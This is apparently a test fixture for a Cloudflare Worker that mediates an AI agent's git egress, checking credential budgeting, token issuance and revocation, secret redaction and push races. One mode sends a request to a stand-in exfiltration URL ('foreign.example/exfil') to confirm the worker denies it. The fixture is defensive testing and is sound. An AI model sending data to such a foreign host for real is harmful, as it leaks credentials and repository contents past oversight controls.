import type { AgentAssignedPush } from "../../src/server/agent-execution-egress";
import { DurableObject } from "cloudflare:workers";
export { AgentEgressWorker } from "../../src/server/agent-egress-worker";
import { agentEgressWorkerResponse, type AgentEgressLedger, type AgentEgressWorkerProps } from "../../src/server/agent-egress-worker";

const remote = `https://${"a".repeat(32)}.artifacts.cloudflare.net/fork.git`;
const props: AgentEgressWorkerProps = { attemptId: "11111111-1111-4111-8111-111111111111", nativeId: "22222222-2222-4222-8222-222222222222", scope: { projectId: "p123456789abc", incarnation: "33333333-3333-4333-8333-333333333333", actorId: "actor", accountKey: "account", taskId: "task", runId: "run", workflowId: "workflow", branchGeneration: 1, canonicalRepoName: "canonical", forkRepoName: "fork", remote, branch: "task/one", expectedTip: "a".repeat(40), access: "read" } };
export class AgentEgressLedgerFixture extends DurableObject {
  async agentRelayCurrent(props: AgentEgressWorkerProps) { return { ...props.scope, actorActive: true, accountActive: true, taskActive: true }; }
  async agentRelayBeforeCredential(_props: AgentEgressWorkerProps, requestId: string) { await this.ctx.storage.put("request", requestId); }
  async agentRelayCredential(_props: AgentEgressWorkerProps, requestId: string, access: "read" | "write") { if (await this.ctx.storage.get("request") !== requestId) throw new Error("Missing native request budget receipt"); await this.ctx.storage.put("issued", requestId); return { repositoryName: "fork", remote, scope: access, token: "server-secret", expiresAt: Date.now() + 60000 }; }
  async agentRelayBeforeTransfer(_props: AgentEgressWorkerProps, requestId: string) { if (await this.ctx.storage.get("issued") !== requestId) throw new Error("Missing native credential receipt"); }
  async revokeAgentCredential(requestId: string) { if (await this.ctx.storage.get("issued") !== requestId) return false; await this.ctx.storage.put("revoked", requestId); return true; }
}
export default { async fetch(request: Request, env: { PRIVATE_EGRESS?: Fetcher }, ctx: ExecutionContext) {
  if (new URL(request.url).pathname === "/entrypoint") { if (!env.PRIVATE_EGRESS) throw new Error("Private service binding required"); return env.PRIVATE_EGRESS.fetch(new Request(`${remote}/info/refs?service=git-upload-pack`)); }

  const mode = new URL(request.url).searchParams.get("mode") ?? "ok", background: Promise<unknown>[] = [], calls: string[] = [], ids: string[] = [], upstream: Array<{authorization:string|null;url:string}> = [];
  const selectedProps: AgentEgressWorkerProps = mode.startsWith("own-push") ? { ...props, scope: { ...props.scope, access: "write" } } : props;
  let remoteTip = props.scope.expectedTip, recordedPush: { requestId: string; command: AgentAssignedPush } | undefined;
  const ledger: AgentEgressLedger = {
    agentRelayCurrent: async (_props, id) => { calls.push("current"); const own = remoteTip === props.scope.expectedTip || recordedPush?.requestId === id && remoteTip === recordedPush.command.newCommit; return { ...selectedProps.scope, actorActive: mode !== "revoked" && own, accountActive: true, taskActive: true }; },
    agentRelayBeforeCredential: async (_props, id) => { calls.push("credential-budget"); ids.push(id); if (mode === "budget") throw new Error("Synthetic allowance unavailable"); },
    agentRelayCredential: async (_props, id, access) => { calls.push("issued"); ids.push(id); if(mode==="late-issuance")await new Promise(resolve=>setTimeout(resolve,10500)); if (mode === "lost-issuance") throw new Error("Token issuance acknowledgement lost server-secret"); return { repositoryName: "fork", remote, scope: access, token: "server-secret", expiresAt: Date.now() + 60000 }; },
    agentRelayBeforeTransfer: async (_props, id, command) => { calls.push("transfer-budget"); ids.push(id); if(command) { if(remoteTip!==command.oldCommit||command.ref!==`refs/heads/${selectedProps.scope.branch}`)throw new Error("Original CAS changed"); recordedPush={requestId:id,command}; calls.push("own-push-recorded"); } },
    revokeAgentCredential: async id => { calls.push("cleanup"); ids.push(id); return mode !== "cleanup-fails" && mode !== "lost-issuance" && !(mode==="late-issuance"&&calls.filter(call=>call==="cleanup").length===1); },
  };
  const target = mode === "denied" ? "https://foreign.example/exfil" : `${remote}/info/refs?service=git-upload-pack`;
  const line=`${"a".repeat(40)} ${"b".repeat(40)} refs/heads/task/one\0report-status\n`, packet=(new TextEncoder().encode(line).length+4).toString(16).padStart(4,"0")+line+"0000PACK";
  const incoming=mode.startsWith("own-push")?new Request(`${remote}/git-receive-pack`,{method:"POST",body:packet}):new Request(target,{headers:{Authorization:"VM-secret"}});
  const response = await agentEgressWorkerResponse(incoming, selectedProps, ledger, promise => { background.push(promise); ctx.waitUntil(promise); }, async request => { calls.push("upstream"); if(mode.startsWith("own-push"))remoteTip=(mode==="own-push-race"?"c":"b").repeat(40); upstream.push({ authorization: request.headers.get("Authorization"), url: request.url }); if (mode === "transport") throw new Error("Sensitive provider exception server-secret"); return new Response("Git protocol bytes", { headers: { Authorization: "response-secret", "Set-Cookie": "response-cookie" } }); });
  const foregroundCleanupCalls=calls.filter(call=>call==="cleanup").length;
  if(mode==="late-issuance")await Promise.all(background);
  return Response.json({ retainedBackground:background.length,foregroundCleanupCalls,recordedPush:recordedPush?.command,status: response.status, body: await response.text(), headers: Object.fromEntries(response.headers), calls, sameRequestId: new Set(ids).size <= 1, upstream });
} };
